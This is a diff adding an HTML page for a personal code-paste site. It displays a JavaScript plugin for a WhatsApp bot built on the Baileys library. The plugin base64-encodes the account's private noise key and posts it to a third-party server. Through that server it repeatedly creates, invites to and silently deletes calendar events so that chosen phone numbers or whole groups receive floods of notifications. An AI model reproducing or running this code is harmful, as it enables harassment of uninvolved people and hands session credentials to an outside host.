@@ -1,0 +1,793 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#f7f6f2">
+<title>VinnPaste — Code Sharing</title>
+
+<style>
+@import url('https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=Space+Grotesk:wght@400;500;600;700;800&display=swap');
+
+:root {
+  --bg: #f7f6f2;
+  --black: #171717;
+  --yellow: #f9dc4a;
+  --blue: #a8d8ff;
+  --green: #b8f28b;
+  --border: 2px solid var(--black);
+  --shadow: 5px 5px 0 var(--black);
+}
+
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+body {
+  background: var(--bg);
+  color: var(--black);
+  font-family: 'Space Grotesk', sans-serif;
+  min-height: 100vh;
+}
+
+button {
+  font: inherit;
+  cursor: pointer;
+}
+
+.navbar {
+  height: 72px;
+  padding: 0 7%;
+  border-bottom: var(--border);
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  background: white;
+}
+
+.logo {
+  font-size: 24px;
+  font-weight: 800;
+  letter-spacing: -1.5px;
+}
+
+.logo span {
+  background: var(--yellow);
+  padding: 2px 6px;
+  border: 2px solid var(--black);
+}
+
+.nav-right {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  font-size: 13px;
+  font-weight: 700;
+}
+
+.status {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+
+.dot {
+  width: 9px;
+  height: 9px;
+  background: #55bd68;
+  border: 1px solid black;
+  border-radius: 50%;
+}
+
+.container {
+  max-width: 1050px;
+  margin: 65px auto;
+  padding: 0 22px;
+}
+
+.eyebrow {
+  font-family: 'DM Mono', monospace;
+  font-size: 12px;
+  margin-bottom: 15px;
+  color: #666;
+}
+
+.heading {
+  font-size: clamp(34px, 6vw, 55px);
+  font-weight: 800;
+  line-height: 1.05;
+  letter-spacing: -3px;
+}
+
+.heading span {
+  background: var(--yellow);
+  padding: 0 8px;
+  border: 2px solid black;
+  box-shadow: 4px 4px 0 black;
+}
+
+.subtitle {
+  color: #666;
+  font-size: 14px;
+  margin-top: 17px;
+  line-height: 1.7;
+}
+
+.paste-card {
+  margin-top: 42px;
+  border: 2px solid var(--black);
+  background: white;
+  box-shadow: var(--shadow);
+}
+
+.card-header {
+  padding: 17px 20px;
+  border-bottom: var(--border);
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 12px;
+  flex-wrap: wrap;
+}
+
+.file-info {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+
+.file-icon {
+  width: 38px;
+  height: 38px;
+  display: grid;
+  place-items: center;
+  background: var(--blue);
+  border: 2px solid black;
+  font-size: 18px;
+}
+
+.filename {
+  font-weight: 800;
+  font-size: 14px;
+}
+
+.file-sub {
+  font-family: 'DM Mono', monospace;
+  font-size: 10px;
+  color: #777;
+  margin-top: 4px;
+}
+
+.actions {
+  display: flex;
+  gap: 9px;
+}
+
+.btn {
+  border: 2px solid black;
+  padding: 10px 15px;
+  font-weight: 800;
+  font-size: 12px;
+  background: white;
+  box-shadow: 3px 3px 0 black;
+  transition: .12s;
+}
+
+.btn:hover {
+  transform: translate(2px, 2px);
+  box-shadow: 1px 1px 0 black;
+}
+
+.copy-btn {
+  background: var(--yellow);
+}
+
+.code-meta {
+  padding: 11px 20px;
+  background: #f0efe9;
+  border-bottom: var(--border);
+  display: flex;
+  gap: 18px;
+  flex-wrap: wrap;
+  font-family: 'DM Mono', monospace;
+  font-size: 10px;
+  color: #555;
+}
+
+.code-area {
+  display: flex;
+  background: #fff;
+  min-height: 400px;
+  overflow: hidden;
+}
+
+.line-numbers {
+  padding: 22px 13px;
+  background: #f3f2ed;
+  border-right: 1px solid #ddd;
+  color: #aaa;
+  text-align: right;
+  font: 12px/1.8 'DM Mono', monospace;
+  user-select: none;
+  white-space: pre;
+}
+
+#code {
+  width: 100%;
+  min-height: 400px;
+  padding: 22px;
+  resize: vertical;
+  border: 0;
+  outline: none;
+  background: white;
+  color: #252525;
+  font: 12px/1.8 'DM Mono', monospace;
+  white-space: pre;
+  overflow: auto;
+  tab-size: 2;
+}
+
+.bottom-info {
+  padding: 15px 20px;
+  border-top: var(--border);
+  display: flex;
+  justify-content: space-between;
+  gap: 10px;
+  flex-wrap: wrap;
+  font-size: 11px;
+  font-weight: 700;
+}
+
+.tag {
+  padding: 5px 9px;
+  border: 1.5px solid black;
+  background: var(--green);
+}
+
+.author-card {
+  margin-top: 35px;
+  padding: 20px;
+  border: var(--border);
+  background: var(--yellow);
+  box-shadow: 4px 4px 0 black;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 15px;
+}
+
+.author-name {
+  font-size: 15px;
+  font-weight: 800;
+}
+
+.author-desc {
+  font-size: 11px;
+  margin-top: 5px;
+}
+
+.author-label {
+  font-family: 'DM Mono', monospace;
+  font-size: 11px;
+  font-weight: 500;
+}
+
+footer {
+  margin-top: 65px;
+  padding: 22px 7%;
+  border-top: var(--border);
+  display: flex;
+  justify-content: space-between;
+  gap: 12px;
+  flex-wrap: wrap;
+  font-size: 11px;
+  font-weight: 700;
+}
+
+footer span:last-child {
+  color: #777;
+}
+
+.toast {
+  position: fixed;
+  bottom: 25px;
+  left: 50%;
+  transform: translate(-50%, 100px);
+  background: var(--black);
+  color: white;
+  padding: 13px 20px;
+  font-size: 13px;
+  font-weight: 700;
+  border: 2px solid black;
+  transition: .25s;
+  z-index: 10;
+}
+
+.toast.show {
+  transform: translate(-50%, 0);
+}
+
+@media(max-width:600px) {
+  .navbar {
+    padding: 0 20px;
+  }
+
+  .container {
+    margin-top: 43px;
+  }
+
+  .heading {
+    letter-spacing: -2px;
+  }
+
+  .card-header {
+    align-items: flex-start;
+  }
+
+  .actions {
+    width: 100%;
+  }
+
+  .actions button {
+    flex: 1;
+  }
+
+  .code-area, #code {
+    min-height: 450px;
+  }
+
+  .author-card {
+    align-items: flex-start;
+    flex-direction: column;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<nav class="navbar">
+  <div class="logo">Vinn<span>Paste.</span></div>
+
+  <div class="nav-right">
+    <div class="status">
+      <div class="dot"></div>
+      PERSONAL PASTE
+    </div>
+  </div>
+</nav>
+
+<main class="container">
+
+  <div class="eyebrow">
+    VINN DEV / CODE ARCHIVE / 001
+  </div>
+
+  <h1 class="heading">
+    Code, stored.<br>
+    <span>Ready to copy.</span>
+  </h1>
+
+  <p class="subtitle">
+    A little place for snippets, experiments, and things<br>
+    worth keeping.
+  </p>
+
+  <section class="paste-card">
+
+    <div class="card-header">
+      <div class="file-info">
+        <div class="file-icon">JS</div>
+
+        <div>
+          <div class="filename">notif.js</div>
+          <div class="file-sub">JAVASCRIPT SOURCE FILE</div>
+        </div>
+      </div>
+
+      <div class="actions">
+        <button class="btn" onclick="resetCode()">
+          RESET
+        </button>
+
+        <button class="btn copy-btn" onclick="copyCode()">
+          COPY CODE ↗
+        </button>
+      </div>
+    </div>
+
+    <div class="code-meta">
+      <span>● JavaScript</span>
+      <span id="lineCount">0 LINES</span>
+      <span id="charCount">0 CHARACTERS</span>
+    </div>
+
+    <div class="code-area">
+      <div class="line-numbers" id="numbers">1</div>
+
+      <textarea
+        id="code"
+        spellcheck="false"
+        autocapitalize="off"
+        autocomplete="off"
+        placeholder="import baileys, { delay } from 'baileys'
+
+const API_URL = 'https://gql.nixel.dev'
+
+/**
+ * @section Credentials & Privacy
+ *
+ * The API requires a limited subset of WhatsApp credentials
+ * to perform event operations.
+ *
+ * @privacy
+ * - me.lid is stored solely for token-cache identification.
+ * - noiseKey.public and noiseKey.private are used temporarily
+ *   during API processing.
+ * - NoiseKey credentials are never stored in the server database
+ *   or any persistent storage.
+ * - No noiseKey credentials are retained after request processing.
+ *
+ * Only me.lid is retained for token-cache identification.
+ * The noiseKey is processed temporarily and discarded afterward.
+ *
+ * @author Nixel
+**/
+
+function getApiCreds(conn) {
+	const creds = conn.authState.creds
+	return {
+		me: {
+			lid: creds.me.lid
+		},
+		noiseKey: {
+			public: Buffer.from(creds.noiseKey.public).toString('base64'),
+			private: Buffer.from(creds.noiseKey.private).toString('base64')
+		}
+	}
+}
+
+async function api(conn, path, body = {}) {
+	const errorRetries = {}
+	const apiCreds = getApiCreds(conn)
+
+	while (true) {
+		try {
+			const response = await fetch(`${API_URL}${path}`, {
+				method: 'POST',
+				headers: {
+					'Content-Type': 'application/json'
+				},
+				body: JSON.stringify({
+					creds: apiCreds,
+					...body
+				})
+			})
+
+			const text = await response.text()
+			let result
+
+			try {
+				result = JSON.parse(text)
+			} catch {
+				throw new Error(`Invalid API response: ${text}`)
+			}
+
+			if (!response.ok || !result.success) {
+				throw new Error(result.message || `HTTP ${response.status}`)
+			}
+
+			return result
+		} catch (err) {
+			const errKey = err.message || 'Unknown Error'
+			errorRetries[errKey] = (errorRetries[errKey] || 0) + 1
+
+			if (errorRetries[errKey] > 5) {
+				throw err
+			}
+
+			await delay(1000)
+		}
+	}
+}
+
+async function createEvent(conn, eventDetails) {
+	return api(conn, '/api/event/create', eventDetails)
+}
+
+async function addInvitations(conn, eventId, userLid) {
+	return api(conn, '/api/event/invite', { eventId, userLid })
+}
+
+async function deleteEvent(conn, eventId) {
+	return api(conn, '/api/event/delete', { eventId })
+}
+
+async function triggerEventNotif(conn, eventDetails, memberLids) {
+	const now = Math.floor(Date.now() / 1000)
+	const res = await createEvent(conn, {
+		name: eventDetails.name || 'New Event',
+		description: eventDetails.description || '',
+		chatJid: eventDetails.chatJid,
+		start_ts_sec: eventDetails.start_ts_sec || now + 3600,
+		end_ts_sec: eventDetails.end_ts_sec || now + 7200,
+		reminder_ts_sec: eventDetails.reminder_ts_sec || now + 3000
+	})
+
+	const eventId = res.data?.id || res.event?.id
+	if (!eventId) throw new Error('Event ID tidak ditemukan')
+
+	if (memberLids && memberLids.length > 0) {
+		const userLid = memberLids.length === 1 ? memberLids[0] : memberLids
+		try {
+			await addInvitations(conn, eventId, userLid)
+		} catch (err) {}
+	}
+
+	return deleteEvent(conn, eventId)
+}
+
+async function toLid(conn, jid) {
+	if (jid.endsWith('@lid') || jid.endsWith('@g.us')) return jid
+	const pn = jid.includes('@') ? jid : `${jid.replace(/[^0-9]/g, '')}@s.whatsapp.net`
+	const lid = await conn.signalRepository?.lidMapping?.getLIDForPN?.(pn)
+	if (!lid) throw new Error(`LID tidak ditemukan untuk ${pn}`)
+	return lid
+}
+
+let handler = async (m, { conn, text, usedPrefix, command }) => {
+	const isNotifUser = command === 'notifuser'
+
+	if (!text) {
+		if (isNotifUser) {
+			return m.reply(
+				`Contoh penggunaan:\n` +
+				`*${usedPrefix + command} @user|woi*\n` +
+				`*${usedPrefix + command} @user1 @user2|woi|5*\n` +
+				`*${usedPrefix + command} 62858xxx|woi|10*\n` +
+				`*${usedPrefix + command} 62858xxx Gw jago | 2*`
+			)
+		} else {
+			return m.reply(
+				`Contoh penggunaan:\n` +
+				`*${usedPrefix + command} woi*\n` +
+				`*${usedPrefix + command} woi|10*`
+			)
+		}
+	}
+
+	await m.react('⌛')
+
+	try {
+		const now = Math.floor(Date.now() / 1000)
+		const startTime = now + 3600
+		const endTime = now + 7200
+		const reminderTime = now + 3000
+		const tasks = []
+
+		if (isNotifUser) {
+			const parts = text.split('|').map(v => v.trim())
+			let targetPart = ''
+			let eventName = 'Woi'
+			let count = 1
+
+			if (parts.length >= 3) {
+				targetPart = parts[0]
+				eventName = parts[1] || 'Woi'
+				const parsedCount = parseInt(parts[2])
+				if (!isNaN(parsedCount) && parsedCount > 0) count = parsedCount
+			} else if (parts.length === 2) {
+				if (/^\d+$/.test(parts[1])) {
+					count = parseInt(parts[1])
+					const firstPart = parts[0]
+					const numMatch = firstPart.match(/^(\+?\d{8,16})\s+([\s\S]+)$/)
+					if (numMatch) {
+						targetPart = numMatch[1]
+						eventName = numMatch[2].trim()
+					} else {
+						targetPart = firstPart
+						eventName = firstPart.replace(/@\S+/g, '').trim() || 'Woi'
+					}
+				} else {
+					targetPart = parts[0]
+					eventName = parts[1] || 'Woi'
+				}
+			} else {
+				const numMatch = parts[0].match(/^(\+?\d{8,16})\s+([\s\S]+)$/)
+				if (numMatch) {
+					targetPart = numMatch[1]
+					eventName = numMatch[2].trim()
+				} else {
+					targetPart = parts[0]
+					eventName = parts[0].replace(/@\S+/g, '').trim() || 'Woi'
+				}
+			}
+
+			let rawTargets = conn.parseMention(targetPart) || []
+
+			if (rawTargets.length === 0) {
+				const numbers = targetPart.match(/\d{8,16}/g) || []
+				for (const num of numbers) {
+					rawTargets.push(`${num}@s.whatsapp.net`)
+				}
+			}
+
+			if (rawTargets.length === 0) {
+				throw new Error('Target tidak valid! Gunakan @mention atau nomor telepon (628xxx).')
+			}
+
+			const targetLids = [...new Set(await Promise.all(rawTargets.map(jid => toLid(conn, jid))))]
+
+			for (const lid of targetLids) {
+				for (let i = 0; i < count; i++) {
+					tasks.push(() =>
+						triggerEventNotif(conn, {
+							name: eventName,
+							description: 'Created and deleted silently',
+							chatJid: lid,
+							start_ts_sec: startTime,
+							end_ts_sec: endTime,
+							reminder_ts_sec: reminderTime
+						}, [lid])
+					)
+				}
+			}
+		} else {
+			const parts = text.split('|').map(v => v.trim())
+			const eventName = parts[0] || 'Woi'
+			const parsedCount = parseInt(parts[1])
+			const count = !isNaN(parsedCount) && parsedCount > 0 ? parsedCount : 1
+
+			let chatJid = m.chat
+			let memberLids = []
+
+			if (m.chat.endsWith('@g.us')) {
+				const groupMetadata = await conn.groupMetadata(m.chat)
+				const participants = groupMetadata.participants || []
+				memberLids = await Promise.all(
+					participants.map(async ({ id }) => {
+						if (id.endsWith('@lid')) return id
+						const lid = await conn.signalRepository?.lidMapping?.getLIDForPN?.(id)
+						return lid || id
+					})
+				)
+			} else {
+				chatJid = await toLid(conn, m.chat)
+				memberLids = [chatJid]
+			}
+
+			for (let i = 0; i < count; i++) {
+				tasks.push(() =>
+					triggerEventNotif(conn, {
+						name: eventName,
+						description: 'Created and deleted silently',
+						chatJid: chatJid,
+						start_ts_sec: startTime,
+						end_ts_sec: endTime,
+						reminder_ts_sec: reminderTime
+					}, memberLids)
+				)
+			}
+		}
+
+		await m.react('⏳')
+		await Promise.all(tasks.map(run => run()))
+		await m.react('✅')
+	} catch (e) {
+		console.error(e)
+		await m.react('❌')
+		m.reply(`Terjadi kesalahan: ${e.message}`)
+	}
+}
+
+handler.command = ['notif', 'notifuser']
+handler.help = [
+	'notif <teks>|<jumlah>',
+	'notifuser <@user/nomor>|<teks>|<jumlah>'
+]
+handler.tags = ['owner']
+handler.group = false
+handler.owner = true
+
+export default handler"
+      ></textarea>
+    </div>
+
+    <div class="bottom-info">
+      <span>UTF-8 · LF</span>
+      <span class="tag">PUBLIC PREVIEW</span>
+    </div>
+
+  </section>
+
+  <section class="author-card">
+    <div>
+      <div class="author-name">Made by Vinn Dev.</div>
+      <div class="author-desc">
+        Building things, one line at a time.
+      </div>
+    </div>
+
+    <div class="author-label">
+      © 2026 VINN
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <span>VINNPASTE © 2026</span>
+  <span>Simple things. Clean code.</span>
+</footer>
+
+<div class="toast" id="toast">
+  Copied successfully!
+</div>
+
+<script>
+const code = document.getElementById('code');
+const numbers = document.getElementById('numbers');
+const toast = document.getElementById('toast');
+
+function updateInfo() {
+  const lines = code.value.split('\n').length;
+
+  numbers.textContent = Array.from(
+    { length: lines },
+    (_, i) => i + 1
+  ).join('\n');
+
+  document.getElementById('lineCount').textContent =
+    lines + ' LINES';
+
+  document.getElementById('charCount').textContent =
+    code.value.length + ' CHARACTERS';
+}
+
+function showToast(message) {
+  toast.textContent = message;
+  toast.classList.add('show');
+
+  setTimeout(() => {
+    toast.classList.remove('show');
+  }, 2000);
+}
+
+async function copyCode() {
+  if (!code.value) {
+    showToast('No code to copy!');
+    return;
+  }
+
+  try {
+    await navigator.clipboard.writeText(code.value);
+    showToast('✓ Code copied!');
+  } catch {
+    code.select();
+    document.execCommand('copy');
+    showToast('✓ Code copied!');
+  }
+}
+
+function resetCode() {
+  if (!confirm('Clear all code?')) return;
+
+  code.value = '';
+  updateInfo();
+  showToast('Editor cleared!');
+}
+
+code.addEventListener('input', updateInfo);
+
+code.addEventListener('scroll', () => {
+  numbers.scrollTop = code.scrollTop;
+});
+
+updateInfo();
+</script>
+
+</body>
+</html>
